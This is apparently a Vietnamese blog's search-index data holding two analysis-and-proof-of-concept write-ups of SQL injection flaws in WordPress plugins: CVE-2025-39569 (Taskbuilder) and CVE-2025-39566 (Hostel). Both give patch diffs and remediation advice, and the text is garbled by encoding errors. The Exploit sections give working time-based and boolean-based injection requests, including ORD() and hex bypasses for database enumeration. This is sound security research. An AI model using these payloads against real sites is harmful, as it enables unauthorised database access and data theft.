__construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. wp_ajax_wppm_get_users lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn: wp_ajax_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p. wp_ajax_nopriv_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p. á» Ä‘Ã¢y, action = wppm_get_users. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i action=wppm_get_users tá»›i admin-ajax.php, thÃ¬ WordPress sáº½ tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½, á»Ÿ Ä‘Ã¢y lÃ  wppm_get_users(). ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c action = wppm_get_users, kiá»ƒm tra xem Ajax nÃ o sá»­ dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a wppm_get_users trÃªn cÃ¡c file .js trong thÆ° má»¥c chá»©a plugin.\nAction wppm_get_users lÃ  pháº§n data trong request POST cá»§a hÃ m wppm_get_users()\nHÃ m wppm_get_users() sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a chá»©c nÄƒng project\nTáº¡o project má»›i Truy cáº­p vÃ o project Ä‘Ã³ Inspect code vÃ  tÃ¬m hÃ m wppm_get_users sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³ ğŸ‘‰ Khi click vÃ o icon bÃªn cáº¡nh Users ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.\nExploit Detect SQLi Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id Ä‘Ãºng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  0x77\nSá»­ dá»¥ng SUBSTRING(STRING,1,1) Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i\ná» Ä‘Ã¢y, $proj_id báº±ng 4 vÃ¬ SUBSTRING('wordpress',1,1)=0x77 lÃ  Ä‘Ãºng nÃªn SELECT láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong IF(condition, value if true, value if false), 4 lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n\nSá»­ dá»¥ng HEX technique Ä‘á»ƒ bypass hÃ m esc_sql() á»Ÿ trÃªn, dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c '\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Vá»›i proj_id khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a None\nğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t boolean base\nproj_id Ä‘Ã¹ng: response khÃ´ng chá»©a None proj_id sai: response chá»©a None CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t time base nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u\nConclusion Lá»— há»•ng CVE-2025-39569 trong plugin WordPress Taskbuilder xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n '...' bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.\nBáº£n vÃ¡ á»Ÿ phiÃªn báº£n 4.0.2 Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a $proj_id vÃ o trong '...', Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.\nKey takeaways:\nÆ¯u tiÃªn sá»­ dá»¥ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query. Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng cÃ¡c Ajax endpoint vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t. NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) vÃ  v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ \u003cstrong\u003exá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o\u003c/strong\u003e trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n \u003ccode\u003e'...'\u003c/code\u003e. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lá»— há»•ng trong plugin Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) vÃ  v1.1.5.7(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« GET request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file controllers/bookings.php\nBáº£n lá»— há»•ng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Báº£n vÃ¡:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } ğŸ‘‰ Báº£n vÃ¡ sá»­ dá»¥ng whitelist Ä‘á»ƒ giá»›i háº¡n cÃ¡c cá»™t cÃ³ thá»ƒ Ä‘Æ°á»£c sáº¯p xáº¿p, náº¿u khÃ´ng há»£p lá»‡ tráº£ vá» 'tB.id'.\nAnalysis: Lá»— há»•ng xuáº¥t hiá»‡n khi param ob Ä‘Æ°á»£c truyá»n trá»±c tiáº¿p vÃ o má»‡nh Ä‘á» ORDER BY thÃ´ng qua hÃ m sanitize_text_field(), chá»‰ escape mÃ  khÃ´ng filter SQLi.\nHow it work? Äá»ƒ inject Ä‘Æ°á»£c, ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh toÃ n bá»™ cÃ¢u query Ä‘Æ°á»£c Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); CÃ¢u query náº±m trong nhÃ¡nh default cá»§a cáº¥u trÃºc switch.\nToÃ n bá»™ Ä‘oáº¡n xá»­ lÃ½ naá»³ thuá»™c vá» hÃ m static manage() cá»§a class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiáº¿p vá»›i core thÃ´ng qua Plugin API (Hook System). Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m manage() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a \u0026quot;manage\u0026quot; trong thÆ° má»¥c chá»©a plugin.\nTrong file models/hostel.php ta cÃ³ hÃ m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } á» Ä‘Ã¢y:\nadd_menu_page() táº¡o menu chÃ­nh trong Admin Dashboard. add_submenu_page() thÃªm cÃ¡c submenu con cho menu Ä‘Ã³. Tham sá»‘ $callback lÃ  má»™t callback function sáº½ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng click vÃ o menu/submenu. VÃ­ dá»¥:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Táº¥t cáº£ menu/submenu nÃ y Ä‘á»u Ä‘Æ°á»£c Ä‘Äƒng kÃ½ bÃªn trong hÃ m static menu() cá»§a class WPHostel. Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m menu() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a menu trong thÆ° má»¥c chá»©a plugin.\nTrong file hostel.php á»Ÿ thÆ° má»¥c gá»‘c cá»§a plugin ta cÃ³:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. Hook name á»Ÿ Ä‘Ã¢y lÃ  admin_menu, nghÄ©a lÃ  hÃ m WPHostel::menu() sáº½ Ä‘Æ°á»£c gá»i trong vÃ²ng Ä‘á»i khi WordPress dá»±ng Admin Dashboard Menu. Menu trÃªn UI Admin Dashboard\nDebugging\nChá»©c nÄƒng bá»‹ lá»—i náº±m trong Booking Manager, vÃ¬ váº­y ta truy cáº­p vÃ o submenu Manager Bookings trÃªn UI Admin Dashboard. Ngay trÆ°á»›c nhÃ¡nh default cÃ³ comment // list bookings =\u0026gt; cho tháº¥y Ä‘oáº¡n code nÃ y xá»­ lÃ½ viá»‡c liá»‡t kÃª vÃ  sáº¯p xáº¿p bookings Má»Ÿ debugger: Click Run with Debugger. Äáº·t breakpoint táº¡i nhÃ¡nh switch chá»©a code lá»—i vÃ  táº¡i dÃ²ng code gÃ¢y lá»—i. Khi click vÃ o má»™t cá»™t trong báº£ng bookings, quan sÃ¡t: Debugger nháº£y vÃ o cáº¥u trÃºc switch. DÃ¹ng Step Over, debugger Ä‘i tiáº¿p vÃ o nhÃ¡nh default. Tiáº¿p tá»¥c Step Over vÃ  theo dÃµi giÃ¡ trá»‹ biáº¿n trong tab Variables \u0026gt; Locals. CÃ¡c biáº¿n nÃ y sáº½ káº¿t há»£p Ä‘á»ƒ táº¡o thÃ nh cÃ¢u SQL bÃªn dÆ°á»›i. Sau khi ghÃ©p cÃ¡c biáº¿n, cÃ¢u query Ä‘áº§y Ä‘á»§ cÃ³ dáº¡ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ÄÃ¡ng chÃº Ã½, biáº¿n $orderby Ä‘Æ°á»£c gÃ¡n nhÆ° sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } âš ï¸ á» Ä‘Ã¢y cÃ³ Ä‘iá»ƒm báº¥t thÆ°á»ng:\nPháº§n sau ORDER BY sá»­ dá»¥ng sanitize_text_field(). HÃ m nÃ y chá»‰ lÃ m sáº¡ch HTML, khÃ´ng há» filter hoáº·c validate Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n trong SQL context. Tham sá»‘ ob (do ngÆ°á»i dÃ¹ng truyá»n vÃ o) vÃ¬ váº­y cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ chÃ¨n trá»±c tiáº¿p vÃ o cÃ¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tÃ¡ch má»‡nh Ä‘á» ORDER BY báº±ng , vÃ¬ nÃ³ cháº¥p nháº­p multi column\nKáº¿t quáº£: thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nDump Data from Database Bypass ' using ORD():\nÄá»ƒ dump dá»¯ liá»‡u cá»§a database ta cáº§n thá»­ Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a database name.\nDo sanitize_text_field() loáº¡i bá» ', ta khÃ´ng dÃ¹ng Ä‘Æ°á»£c payload so sÃ¡nh trá»±c tiáº¿p. Thay vÃ o Ä‘Ã³ dÃ¹ng ORD() Ä‘á»ƒ so sÃ¡nh kÃ½ tá»± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nBypass ' using Hex encoding (extend)\nNgoÃ i ORD() ta cÃ³ thá»ƒ sá»­ dá»¥ng Hex encoding Ä‘á»ƒ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nConclusion Lá»— há»•ng CVE-2025-39566 trong plugin WordPress Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nKey takeaways:\nsanitize_text_field() â‰  chá»‘ng SQL Injection Cáº§n phÃ¢n biá»‡t rÃµ: lá»c input cho HTML vs cho SQL References SQL Injection Cheat Sheet â€“ PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLá»— há»•ng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) vÃ  v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« \u003cstrong\u003eGET\u003c/strong\u003e request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\nRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ 